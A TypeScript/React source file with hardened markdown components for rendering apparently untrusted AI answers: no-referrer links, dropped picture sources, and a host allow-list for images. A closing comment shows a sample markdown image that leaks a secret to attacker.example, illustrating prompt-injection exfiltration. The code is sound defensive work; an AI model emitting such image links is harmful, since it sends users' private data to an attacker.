import type { MouseEvent } from 'react';
import type { Components } from 'streamdown';

/** Class on the wrapper of every view; in-page anchors stay inside it. */
export const ROOT_CLASS = 'rlm-markdown';

/**
 * In-page anchors (GFM footnotes `#user-content-fn-1` and their back-refs) scroll inside the view
 * that holds them. Several views on one page each number footnotes from 1, so a document-wide hash
 * jump would land on the first view's footnote, and it would rewrite the page URL.
 */
function scrollToAnchorInView(event: MouseEvent<HTMLAnchorElement>, href: string) {
  const id = decodeURIComponent(href.slice(1));
  const view = event.currentTarget.closest(`.${ROOT_CLASS}`);
  const target = view?.querySelector(`[id="${CSS.escape(id)}"]`);
  if (!target) return;
  event.preventDefault();
  // Respect "reduce motion": jump instead of animating.
  const reduce = typeof matchMedia === 'function' && matchMedia('(prefers-reduced-motion: reduce)').matches;
  target.scrollIntoView({ behavior: reduce ? 'auto' : 'smooth', block: 'center' });
}

/**
 * Overrides for the few elements that need behavior, not just style (everything else is styled by
 * `styles.css`): links open in a new tab without a referrer, images load lazily without a
 * referrer, and `<picture><source srcset>` is dropped because it would load an image without going
 * through the URL policy.
 */
export const SAFE_COMPONENTS: Components = {
  a: ({ href, children, id, ...props }) => {
    // The URL policy removed the href (javascript:, data:, …): show the text, not something that looks clickable.
    if (typeof href !== 'string' || href === '') return <span id={id}>{children}</span>;
    if (href.startsWith('#')) {
      return (
        <a
          aria-describedby={props['aria-describedby']}
          aria-label={props['aria-label']}
          className="rlm-link"
          href={href}
          id={id}
          onClick={(event) => scrollToAnchorInView(event, href)}
        >
          {children}
        </a>
      );
    }
    return (
      <a
        className="rlm-link"
        href={href}
        id={id}
        referrerPolicy="no-referrer"
        rel="noopener noreferrer nofollow"
        target="_blank"
      >
        {children}
      </a>
    );
  },
  img: ({ src, alt }) => (
    <img
      alt={alt ?? ''}
      className="rlm-img"
      loading="lazy"
      referrerPolicy="no-referrer"
      src={typeof src === 'string' ? src : undefined}
    />
  ),
  picture: ({ children }) => <>{children}</>,
  source: () => null,
};

/**
 * An image the app's `isImageAllowed` refused: its alt text in brackets, never requested. Loading remote images is how
 * a prompt injection leaks data (`![](https://attacker.example/?q=<secret>)`), so apps that render untrusted answers can
 * restrict hosts.
 */
export function imageWithPolicy(isImageAllowed: (url: string) => boolean): Components['img'] {
  return function PolicyImage({ src, alt }) {
    if (typeof src !== 'string' || !src || !isImageAllowed(src)) {
      return <span className="rlm-img-blocked">{`[${alt || 'image'}]`}</span>;
    }
    return <img alt={alt ?? ''} className="rlm-img" loading="lazy" referrerPolicy="no-referrer" src={src} />;
  };
}
